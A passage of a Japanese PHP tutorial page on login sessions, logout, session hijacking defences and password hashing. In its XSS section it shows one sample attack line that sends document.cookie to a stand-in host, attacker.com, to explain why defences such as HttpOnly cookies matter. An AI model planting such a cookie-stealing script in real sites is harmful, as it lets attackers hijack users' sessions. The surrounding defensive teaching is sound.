4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg></div><div><div class="font-medium text-slate-800">session_regenerate_id()</div><div class="text-sm text-slate-600">セッション固定攻撃を防ぐためIDを再発行</div></div></div></div></div></div></div></details>
+<details class="rounded-lg border border-slate-200 dark:border-slate-700 px-4 py-4 my-4 hover:shadow transition outline-none focus:ring-0 focus:outline-none"><summary class="cursor-pointer select-none text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-slate-100 font-bold">ログイン状態チェック関数の作成</summary><div class="mt-6 text-slate-600 dark:text-slate-400"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">funcs.php にセッションチェック関数を追加：</strong></p><div><div class="group relative my-4 rounded-lg overflow-hidden border border-slate-200 dark:border-slate-700"><button class="absolute right-2 top-2 rounded bg-slate-800/70 px-2 py-1 text-xs text-white opacity-0 transition-opacity group-hover:opacity-100 z-10">コピー</button><pre class="language-php !m-0 !p-4 !bg-slate-900 dark:!bg-slate-950 !text-slate-100 overflow-x-auto"><code class="language-php">&lt;?php
+// 既存の関数に追加
+
+// セッションチェック関数
+function sschk() {
+    if (!isset($_SESSION[&#x27;chk_ssid&#x27;]) || $_SESSION[&#x27;chk_ssid&#x27;] != session_id()) {
+        exit(&#x27;LOGIN ERROR&#x27;);
+    } else {
+        // セッションIDを再生成（セキュリティ強化）
+        session_regenerate_id(true);
+        $_SESSION[&#x27;chk_ssid&#x27;] = session_id();
+    }
+}
+?&gt;
+</code></pre></div></div><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">保護したいページでセッションチェック：</strong></p><div><div class="group relative my-4 rounded-lg overflow-hidden border border-slate-200 dark:border-slate-700"><button class="absolute right-2 top-2 rounded bg-slate-800/70 px-2 py-1 text-xs text-white opacity-0 transition-opacity group-hover:opacity-100 z-10">コピー</button><pre class="language-php !m-0 !p-4 !bg-slate-900 dark:!bg-slate-950 !text-slate-100 overflow-x-auto"><code class="language-php">&lt;?php
+// select.php の先頭に追加
+session_start();
+include(&quot;funcs.php&quot;);
+
+// ログイン状態をチェック
+sschk();
+
+// 以下、既存のコード...
+?&gt;
+</code></pre></div></div><div class="my-6 p-4 rounded-lg border bg-yellow-50 dark:bg-yellow-900/20 border-yellow-200 dark:border-yellow-800 flex gap-3"><div class="flex-shrink-0"><svg class="w-5 h-5 text-yellow-600 dark:text-yellow-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z"></path></svg></div><div class="flex-1 min-w-0"><div class="font-semibold mb-1 text-yellow-800 dark:text-yellow-200">すべての保護ページで実装必須</div><div class="text-slate-700 dark:text-slate-300"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><code class="inline-block px-1.5 py-0.5 mx-0.5 text-sm font-mono bg-slate-100 dark:bg-slate-800 text-slate-800 dark:text-slate-200 rounded border border-slate-200 dark:border-slate-700">detail.php</code>、<code class="inline-block px-1.5 py-0.5 mx-0.5 text-sm font-mono bg-slate-100 dark:bg-slate-800 text-slate-800 dark:text-slate-200 rounded border border-slate-200 dark:border-slate-700">update.php</code>、<code class="inline-block px-1.5 py-0.5 mx-0.5 text-sm font-mono bg-slate-100 dark:bg-slate-800 text-slate-800 dark:text-slate-200 rounded border border-slate-200 dark:border-slate-700">delete.php</code> など、ログインが必要なすべてのページで同様にセッションチェックを実装してください。</p></div></div></div><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">セッションチェックの動作：</strong></p><div class="my-6 p-4 rounded-lg border border-slate-200 dark:border-slate-700 bg-slate-50/30 dark:bg-slate-800/30"><div class="text-center text-slate-500 dark:text-slate-400 text-sm py-4">図表を読み込み中...</div><div class="text-center w-full flex justify-center hidden"></div></div></div></details>
+<details class="rounded-lg border border-slate-200 dark:border-slate-700 px-4 py-4 my-4 hover:shadow transition outline-none focus:ring-0 focus:outline-none"><summary class="cursor-pointer select-none text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-slate-100 font-bold">ログアウト処理の実装</summary><div class="mt-6 text-slate-600 dark:text-slate-400"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">logout.php（ログアウト処理）：</strong></p><div><div class="group relative my-4 rounded-lg overflow-hidden border border-slate-200 dark:border-slate-700"><button class="absolute right-2 top-2 rounded bg-slate-800/70 px-2 py-1 text-xs text-white opacity-0 transition-opacity group-hover:opacity-100 z-10">コピー</button><pre class="language-php !m-0 !p-4 !bg-slate-900 dark:!bg-slate-950 !text-slate-100 overflow-x-auto"><code class="language-php">&lt;?php
+session_start();
+include(&quot;funcs.php&quot;);
+
+// セッションの中身をすべて削除
+$_SESSION = array();
+
+// セッションクッキーの削除
+if (ini_get(&quot;session.use_cookies&quot;)) {
+    $params = session_get_cookie_params();
+    setcookie(session_name(), &#x27;&#x27;, time() - 42000,
+        $params[&quot;path&quot;], $params[&quot;domain&quot;],
+        $params[&quot;secure&quot;], $params[&quot;httponly&quot;]
+    );
+}
+
+// セッション破棄
+session_destroy();
+
+// ログインページにリダイレクト
+redirect(&#x27;login.php&#x27;);
+?&gt;
+</code></pre></div></div><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">ナビゲーションにログアウトリンクを追加：</strong></p><div><div class="group relative my-4 rounded-lg overflow-hidden border border-slate-200 dark:border-slate-700"><button class="absolute right-2 top-2 rounded bg-slate-800/70 px-2 py-1 text-xs text-white opacity-0 transition-opacity group-hover:opacity-100 z-10">コピー</button><pre class="language-php !m-0 !p-4 !bg-slate-900 dark:!bg-slate-950 !text-slate-100 overflow-x-auto"><code class="language-php">&lt;!-- select.php のヘッダー部分 --&gt;
+&lt;header&gt;
+  &lt;nav class=&quot;navbar navbar-default&quot;&gt;
+    &lt;div class=&quot;container-fluid&quot;&gt;
+      &lt;div class=&quot;navbar-header&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot; href=&quot;select.php&quot;&gt;データ一覧&lt;/a&gt;
+      &lt;/div&gt;
+      &lt;div class=&quot;navbar-header&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;新規登録&lt;/a&gt;
+      &lt;/div&gt;
+      &lt;div class=&quot;navbar-header&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot; href=&quot;logout.php&quot;&gt;ログアウト&lt;/a&gt;
+      &lt;/div&gt;
+      &lt;div class=&quot;navbar-text&quot;&gt;
+        ようこそ、&lt;?= h($_SESSION[&#x27;name&#x27;]) ?&gt;さん
+        &lt;?= $_SESSION[&#x27;kanri_flg&#x27;] == 1 ? &#x27;（管理者）&#x27; : &#x27;（一般ユーザー）&#x27; ?&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/nav&gt;
+&lt;/header&gt;
+</code></pre></div></div><div class="my-6 p-4 rounded-lg border bg-emerald-50 dark:bg-emerald-900/20 border-emerald-200 dark:border-emerald-800 flex gap-3"><div class="flex-shrink-0"><svg class="w-5 h-5 text-emerald-600 dark:text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg></div><div class="flex-1 min-w-0"><div class="font-semibold mb-1 text-emerald-800 dark:text-emerald-200">完全なログアウト処理</div><div class="text-slate-700 dark:text-slate-300"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed">上記のコードは以下を実行します：</p><ol class="mb-4 space-y-1 text-slate-700 dark:text-slate-300 pl-6 list-decimal">
+<li class="relative ml-2">セッションデータの削除</li>
+<li class="relative ml-2">セッションクッキーの削除</li>
+<li class="relative ml-2">セッション自体の破棄</li>
+<li class="relative ml-2">ログインページへのリダイレクト</li>
+</ol></div></div></div></div></details>
+<h2 class="text-2xl font-semibold mb-3 mt-12 text-slate-800 dark:text-slate-200">セッションハイジャック攻撃と対策</h2>
+<details class="rounded-lg border border-slate-200 dark:border-slate-700 px-4 py-4 my-4 hover:shadow transition outline-none focus:ring-0 focus:outline-none"><summary class="cursor-pointer select-none text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-slate-100 font-bold">セッションハイジャックとは</summary><div class="mt-6 text-slate-600 dark:text-slate-400"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">セッションハイジャック</strong>は、攻撃者が他人のセッションIDを盗み取り、その人になりすましてシステムにアクセスする攻撃手法です。</p><div class="my-6 p-4 rounded-lg border bg-red-50 dark:bg-red-900/20 border-red-200 dark:border-red-800 flex gap-3"><div class="flex-shrink-0"><svg class="w-5 h-5 text-red-600 dark:text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v3.75m9-.75a9 9 0 11-18 0 9 9 0 0118 0zm-9 3.75h.008v.008H12v-.008z"></path></svg></div><div class="flex-1 min-w-0"><div class="font-semibold mb-1 text-red-800 dark:text-red-200">攻撃の深刻さ</div><div class="text-slate-700 dark:text-slate-300"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed">セッションハイジャックが成功すると：</p><ul class="mb-4 space-y-1 text-slate-700 dark:text-slate-300 pl-6 list-disc">
+<li class="relative ml-2">正規ユーザーの権限を完全に奪取</li>
+<li class="relative ml-2">機密情報へのアクセス</li>
+<li class="relative ml-2">データの改ざん・削除</li>
+<li class="relative ml-2">管理者権限の乗っ取り</li>
+</ul></div></div></div><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">主な攻撃手法：</strong></p><div class="my-6 "><div class="infographic-content"><div class="space-y-3"><div class="flex items-start p-3 bg-red-50 rounded border border-red-200"><div class="w-6 h-6 text-red-600 mr-3 mt-0.5"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg></div><div><div class="font-medium text-slate-800">1. ネットワーク盗聴</div><div class="text-sm text-slate-600">HTTP通信を傍受してセッションIDを取得</div></div></div><div class="flex items-start p-3 bg-red-50 rounded border border-red-200"><div class="w-6 h-6 text-red-600 mr-3 mt-0.5"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg></div><div><div class="font-medium text-slate-800">2. XSS攻撃</div><div class="text-sm text-slate-600">悪意のあるスクリプトでCookieを盗み取る</div></div></div><div class="flex items-start p-3 bg-red-50 rounded border border-red-200"><div class="w-6 h-6 text-red-600 mr-3 mt-0.5"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m18-6h-2m2 6h-2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2zM9 9h6v6H9V9z"></path></svg></div><div><div class="font-medium text-slate-800">3. セッション予測攻撃</div><div class="text-sm text-slate-600">セッションIDの生成パターンを解析して推測</div></div></div><div class="flex items-start p-3 bg-red-50 rounded border border-red-200"><div class="w-6 h-6 text-red-600 mr-3 mt-0.5"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"></path></svg></div><div><div class="font-medium text-slate-800">4. セッション固定攻撃</div><div class="text-sm text-slate-600">攻撃者が事前に用意したセッションIDを被害者に使わせる</div></div></div></div></div></div></div></details>
+<details class="rounded-lg border border-slate-200 dark:border-slate-700 px-4 py-4 my-4 hover:shadow transition outline-none focus:ring-0 focus:outline-none"><summary class="cursor-pointer select-none text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-slate-100 font-bold">XSS攻撃によるセッション盗取例</summary><div class="mt-6 text-slate-600 dark:text-slate-400"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">攻撃例：悪意のあるJavaScript</strong></p><div><div class="group relative my-4 rounded-lg overflow-hidden border border-slate-200 dark:border-slate-700"><button class="absolute right-2 top-2 rounded bg-slate-800/70 px-2 py-1 text-xs text-white opacity-0 transition-opacity group-hover:opacity-100 z-10">コピー</button><pre class="language-javascript !m-0 !p-4 !bg-slate-900 dark:!bg-slate-950 !text-slate-100 overflow-x-auto"><code class="language-javascript">// 攻撃者が仕込む悪意のあるスクリプト
+document.location = &#x27;http://attacker.com/steal.php?cookie=&#x27; + document.cookie;
+</code></pre></div></div><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed">このスクリプトが実行されると、ユーザーのCookie（セッションIDを含む）が攻撃者のサーバーに送信されます。</p><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">攻撃の流れ：</strong></p><div class="my-6 p-4 rounded-lg border border-slate-200 dark:border-slate-700 bg-slate-50/30 dark:bg-slate-800/30"><div class="text-center text-slate-500 dark:text-slate-400 text-sm py-4">図表を読み込み中...</div><div class="text-center w-full flex justify-center hidden"></div></div></div></details>
+<details class="rounded-lg border border-slate-200 dark:border-slate-700 px-4 py-4 my-4 hover:shadow transition outline-none focus:ring-0 focus:outline-none"><summary class="cursor-pointer select-none text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-slate-100 font-bold">セキュリティ対策の実装</summary><div class="mt-6 text-slate-600 dark:text-slate-400"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">基本的なセキュリティ設定：</strong></p><div><div class="group relative my-4 rounded-lg overflow-hidden border border-slate-200 dark:border-slate-700"><button class="absolute right-2 top-2 rounded bg-slate-800/70 px-2 py-1 text-xs text-white opacity-0 transition-opacity group-hover:opacity-100 z-10">コピー</button><pre class="language-php !m-0 !p-4 !bg-slate-900 dark:!bg-slate-950 !text-slate-100 overflow-x-auto"><code class="language-php">&lt;?php
+// セキュアなセッション設定
+ini_set(&#x27;session.cookie_httponly&#x27;, 1);    // XSS対策
+ini_set(&#x27;session.cookie_secure&#x27;, 1);      // HTTPS必須（本番環境）
+ini_set(&#x27;session.cookie_samesite&#x27;, &#x27;Strict&#x27;); // CSRF対策
+ini_set(&#x27;session.use_strict_mode&#x27;, 1);    // セッション固定攻撃対策
+
+session_start();
+?&gt;
+</code></pre></div></div><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">高度なセッション検証関数：</strong></p><div><div class="group relative my-4 rounded-lg overflow-hidden border border-slate-200 dark:border-slate-700"><button class="absolute right-2 top-2 rounded bg-slate-800/70 px-2 py-1 text-xs text-white opacity-0 transition-opacity group-hover:opacity-100 z-10">コピー</button><pre class="language-php !m-0 !p-4 !bg-slate-900 dark:!bg-slate-950 !text-slate-100 overflow-x-auto"><code class="language-php">&lt;?php
+// funcs.php に追加
+function validateSession() {
+    // IPアドレス検証
+    if (isset($_SESSION[&#x27;ip_address&#x27;]) &amp;&amp; $_SESSION[&#x27;ip_address&#x27;] !== $_SERVER[&#x27;REMOTE_ADDR&#x27;]) {
+        session_destroy();
+        return false;
+    }
+    
+    // User-Agent検証
+    if (isset($_SESSION[&#x27;user_agent&#x27;]) &amp;&amp; $_SESSION[&#x27;user_agent&#x27;] !== $_SERVER[&#x27;HTTP_USER_AGENT&#x27;]) {
+        session_destroy();
+        return false;
+    }
+    
+    // タイムアウト検証（30分）
+    if (isset($_SESSION[&#x27;last_activity&#x27;]) &amp;&amp; (time() - $_SESSION[&#x27;last_activity&#x27;] &gt; 1800)) {
+        session_destroy();
+        return false;
+    }
+    
+    // 最終アクセス時刻を更新
+    $_SESSION[&#x27;last_activity&#x27;] = time();
+    return true;
+}
+
+// 改良版セッションチェック関数
+function sschk() {
+    if (!isset($_SESSION[&#x27;chk_ssid&#x27;]) || $_SESSION[&#x27;chk_ssid&#x27;] != session_id()) {
+        exit(&#x27;LOGIN ERROR&#x27;);
+    }
+    
+    // 追加のセキュリティ検証
+    if (!validateSession()) {
+        redirect(&#x27;login.php&#x27;);
+    }
+    
+    // セッションIDを再生成
+    session_regenerate_id(true);
+    $_SESSION[&#x27;chk_ssid&#x27;] = session_id();
+}
+?&gt;
+</code></pre></div></div><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">ログイン時にセキュリティ情報を記録：</strong></p><div><div class="group relative my-4 rounded-lg overflow-hidden border border-slate-200 dark:border-slate-700"><button class="absolute right-2 top-2 rounded bg-slate-800/70 px-2 py-1 text-xs text-white opacity-0 transition-opacity group-hover:opacity-100 z-10">コピー</button><pre class="language-php !m-0 !p-4 !bg-slate-900 dark:!bg-slate-950 !text-slate-100 overflow-x-auto"><code class="language-php">&lt;?php
+// login_act.php での認証成功時に追加
+if ($val[&#x27;id&#x27;] != &quot;&quot;) {
+    // 既存のセッション設定
+    $_SESSION[&#x27;chk_ssid&#x27;]  = session_id();
+    $_SESSION[&#x27;kanri_flg&#x27;] = $val[&#x27;kanri_flg&#x27;];
+    $_SESSION[&#x27;name&#x27;]      = $val[&#x27;name&#x27;];
+    $_SESSION[&#x27;user_id&#x27;]   = $val[&#x27;id&#x27;];
+    
+    // セキュリティ情報を記録
+    $_SESSION[&#x27;ip_address&#x27;] = $_SERVER[&#x27;REMOTE_ADDR&#x27;];
+    $_SESSION[&#x27;user_agent&#x27;] = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];
+    $_SESSION[&#x27;login_time&#x27;] = time();
+    $_SESSION[&#x27;last_activity&#x27;] = time();
+    
+    session_regenerate_id(true);
+    $_SESSION[&#x27;chk_ssid&#x27;] = session_id();
+    
+    redirect(&#x27;select.php&#x27;);
+}
+?&gt;
+</code></pre></div></div><div class="my-6 p-4 rounded-lg border bg-emerald-50 dark:bg-emerald-900/20 border-emerald-200 dark:border-emerald-800 flex gap-3"><div class="flex-shrink-0"><svg class="w-5 h-5 text-emerald-600 dark:text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg></div><div class="flex-1 min-w-0"><div class="font-semibold mb-1 text-emerald-800 dark:text-emerald-200">多層防御の重要性</div><div class="text-slate-700 dark:text-slate-300"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed">セキュリティは複数の対策を組み合わせることが重要です：</p><ol class="mb-4 space-y-1 text-slate-700 dark:text-slate-300 pl-6 list-decimal">
+<li class="relative ml-2"><strong class="font-semibold text-slate-900 dark:text-slate-100">HttpOnly</strong>: JavaScriptからのアクセスを防ぐ</li>
+<li class="relative ml-2"><strong class="font-semibold text-slate-900 dark:text-slate-100">Secure</strong>: HTTPS通信でのみ送信</li>
+<li class="relative ml-2"><strong class="font-semibold text-slate-900 dark:text-slate-100">SameSite</strong>: CSRF攻撃を防ぐ</li>
+<li class="relative ml-2"><strong class="font-semibold text-slate-900 dark:text-slate-100">セッション検証</strong>: IPアドレス・User-Agent確認</li>
+<li class="relative ml-2"><strong class="font-semibold text-slate-900 dark:text-slate-100">タイムアウト</strong>: 一定時間後に自動ログアウト</li>
+</ol></div></div></div></div></details>
+<h2 class="text-2xl font-semibold mb-3 mt-12 text-slate-800 dark:text-slate-200">パスワードハッシュ化</h2>
+<details class="rounded-lg border border-slate-200 dark:border-slate-700 px-4 py-4 my-4 hover:shadow transition outline-none focus:ring-0 focus:outline-none"><summary class="cursor-pointer select-none text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-slate-100 font-bold">なぜハッシュ化が必要なのか？</summary><div class="mt-6 text-slate-600 dark:text-slate-400"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">平文パスワードの危険性：</strong></p><div class="my-6 p-4 rounded-lg border bg-red-50 dark:bg-red-900/20 border-red-200 dark:border-red-800 flex gap-3"><div class="flex-shrink-0"><svg class="w-5 h-5 text-red-600 dark:text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v3.75m9-.75a9 9 0 11-18 0 9 9 0 0118 0zm-9 3.75h.008v.008H12v-.008z"></path></svg></div><div class="flex-1 min-w-0"><div class="font-semibold mb-1 text-red-800 dark:text-red-200">絶対にやってはいけないこと</div><div class="text-slate-700 dark:text-slate-300"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed">パスワードを平文（そのまま）でデータベースに保存すること！</p></div></div></div><div class="my-6 "><div class="infographic-content"><div class="grid grid-cols-1 md:grid-cols-2 gap-6"><div class="p-4 bg-red-50 rounded border border-red-200"><div class="flex items-center mb-3"><div class="w-6 h-6 text-red-600 mr-2"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 15.5c-.77.833.192 2.5 1.732 2.5z"></path></svg></div><div class="font-medium text-red-800">平文パスワードの問題</div></div><div class="text-sm text-red-700"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong>データ漏洩時:</strong> パスワードがそのまま露出<br/>
+<strong>内部犯行:</strong> 管理者がパスワードを知ることができる<br/>
+<strong>ログ出力:</strong> 誤ってパスワードがログに記録される<br/>
+<strong>他サービス:</strong> 同じパスワードを使い回されている場合の被害拡大</p></div></div><div class="p-4 bg-green-50 rounded border border-green-200"><div class="flex items-center mb-3"><div class="w-6 h-6 text-green-600 mr-2"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg></div><div class="font-medium text-green-800">ハッシュ化の利点</div></div><div class="text-sm text-green-700"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong>不可逆性:</strong> ハッシュから元パスワードを復元不可<br/>
+<strong>セキュア:</strong> データ漏洩時もパスワードは保護される<br/>
+<strong>検証可能:</strong> 入力パスワードとの照合が可能<br/>
+<strong>業界標準:</strong> すべてのWebサービスで採用</p></div></div></div></div></div></div></details>
+<details class="rounded-lg border border-slate-200 dark:border-slate-700 px-4 py-4 my-4 hover:shadow transition outline-none focus:ring-0 focus:outline-none"><summary class="cursor-pointer select-none text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-slate-100 font-bold">PHPでのパスワードハッシュ化</summary><div class="mt-6 text-slate-600 dark:text-slate-400"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">パスワードハッシュ化の基本：</strong></p><div><div class="group relative my-4 rounded-lg overflow-hidden border border-slate-200 dark:border-slate-700"><button class="absolute right-2 top-2 rounded bg-slate-800/70 px-2 py-1 text-xs text-white opacity-0 transition-opacity group-hover:opacity-100 z-10">コピー</button><pre class="language-php !m-0 !p-4 !bg-slate-900 dark:!bg-slate-950 !text-slate-100 overflow-x-auto"><code class="language-php">&lt;?php
+// hash.php
+$password = &quot;test123&quot;;
+
+// パスワードをハッシュ化
+$hashed_password = password_hash($password, PASSWORD_DEFAULT);
+echo &quot;ハッシュ化されたパスワード: &quot; . $hashed_password . &quot;&lt;br&gt;&quot;;
+
+// パスワード検証
+$is_valid = password_verify(&quot;test123&quot;, $hashed_password);
+var_dump($is_valid); // bool(true)
+
+// 間違ったパスワードで検証
+$is_invalid = password_verify(&quot;wrong&quot;, $hashed_password);
+var_dump($is_invalid); // bool(false)
+?&gt;
+</code></pre></div></div><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">実行結果例：</strong></p><div><code class="inline-block px-1.5 py-0.5 mx-0.5 text-sm font-mono bg-slate-100 dark:bg-slate-800 text-slate-800 dark:text-slate-200 rounded border border-slate-200 dark:border-slate-700">ハッシュ化されたパスワード: $2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi
+bool(true)
+bool(false)
+</code></div><div class="my-6 p-4 rounded-lg border bg-blue-50 dark:bg-blue-900/20 border-blue-200 dark:border-blue-800 flex gap-3"><div class="flex-shrink-0"><svg class="w-5 h-5 text-blue-600 dark:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg></div><div class="flex-1 min-w-0"><div class="font-semibold mb-1 text-blue-800 dark:text-blue-200">ハッシュの特徴</div><div class="text-slate-700 dark:text-slate-300"><ul class="mb-4 space-y-1 text-slate-700 dark:text-slate-300 pl-6 list-disc">
+<li class="relative ml-2">同じパスワードでも実行するたびに異なるハッシュが生成される</li>
+<li class="relative ml-2">これは「ソルト」という仕組みによるもの</li>
+<li class="relative ml-2">しかし <code class="inline-block px-1.5 py-0.5 mx-0.5 text-sm font-mono bg-slate-100 dark:bg-slate-800 text-slate-800 dark:text-slate-200 rounded border border-slate-200 dark:border-slate-700">password_verify()</code> で正しく検証できる</li>
+</ul></div></div></div><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">データベースのパスワードを更新：</strong></p><div><div class="group relative my-4 rounded-lg overflow-hidden border border-slate-200 dark:border-slate-700"><button class="absolute right-2 top-2 rounded bg-slate-800/70 px-2 py-1 text-xs text-white opacity-0 transition-opacity group-hover:opacity-100 z-10">コピー</button><pre class="language-php !m-0 !p-4 !bg-slate-900 dark:!bg-slate-950 !text-slate-100 overflow-x-auto"><code class="language-php">&lt;?php
+// パスワードハッシュ化用スクリプト
+$passwords = [
+    &#x27;admin@example.com&#x27; =&gt; &#x27;admin123&#x27;,
+    &#x27;user@example.com&#x27; =&gt; &#x27;user123&#x27;
+];
+
+include(&quot;funcs.php&quot;);
+$pdo = db_conn();
+
+foreach ($passwords as $lid =&gt; $plain_password) {
+    $hashed_password = password_hash($plain_password, PASSWORD_DEFAULT);
+    
+    $sql = &quot;UPDATE gs_user_table SET lpw = :lpw WHERE lid = :lid&quot;;
+    $stmt = $pdo-&gt;prepare($sql);
+    $stmt-&gt;bindValue(&#x27;:lpw&#x27;, $hashed_password, PDO::PARAM_STR);
+    $stmt-&gt;bindValue(&#x27;:lid&#x27;, $lid, PDO::PARAM_STR);
+    $stmt-&gt;execute();
+    
+    echo $lid . &quot; のパスワードを更新しました&lt;br&gt;&quot;;
+}
+?&gt;
+</code></pre></div></div></div></details>
+<details class="rounded-lg border border-slate-200 dark:border-slate-700 px-4 py-4 my-4 hover:shadow transition outline-none focus:ring-0 focus:outline-none"><summary class="cursor-pointer select-none text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-slate-100 font-bold">認証処理の改良</summary><div class="mt-6 text-slate-600 dark:text-slate-400"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">login_act.php をハッシュ化対応に修正：</strong></p><div><div class="group relative my-4 rounded-lg overflow-hidden border border-slate-200 dark:border-slate-700"><button class="absolute right-2 top-2 rounded bg-slate-800/70 px-2 py-1 text-xs text-white opacity-0 transition-opacity group-hover:opacity-100 z-10">コピー</button><pre class="language-php !m-0 !p-4 !bg-slate-900 dark:!bg-slate-950 !text-slate-100 overflow-x-auto"><code class="language-php">&lt;?php
+session_start();
+include(&quot;funcs.php&quot;);
+
+// 1. POSTデータ取得
+$lid = $_POST[&quot;lid&quot;];
+$lpw = $_POST[&quot;lpw&quot;];
+
+// 2. DB接続
+$pdo = db_conn();
+
+// 3. ログインIDのみで検索（パスワードは後で検証）
+$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM gs_user_table WHERE lid = :lid&quot;);
+$stmt-&gt;bindValue(&#x27;:lid&#x27;, $lid, PDO::PARAM_STR);
+$status = $stmt-&gt;execute();
+
+if ($status == false) {
+    sql_error($stmt);
+}
+
+// 4. ユーザー情報を取得
+$val = $stmt-&gt;fetch();
+
+// 5. パスワード検証
+if ($val &amp;&amp; password_verify($lpw, $val[&quot;lpw&quot;])) {
+    // ログイン成功
